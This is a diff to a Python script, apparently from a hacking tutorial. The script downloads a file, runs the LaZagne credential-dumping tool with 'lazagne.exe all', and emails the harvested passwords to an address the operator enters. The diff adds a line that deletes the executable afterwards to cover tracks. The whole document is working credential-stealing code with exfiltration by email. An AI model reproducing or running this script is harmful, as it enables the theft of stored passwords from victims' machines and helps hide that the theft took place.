@@ -1,7 +1,9 @@
 #!/usr/bin/env python3
 
-import requests, subprocess, smtplib, re
+import os, re, requests, smtplib, subprocess
 #import requests - enable http requests module through python
+#os - library for cross-platform os command calls; otherwise you'd have to use
+#subprocess.call and the specific platform commmand
 
 def download(url):
     get_response = requests.get(url)
@@ -31,3 +33,4 @@ password = input("Enter email password: ")
 command = "lazagne.exe all"
 result = subprocess.check_output(command, shell=True)
 send_email(email, password, result)
+os.remove("lazagne.exe") #delete executed file once it finishes
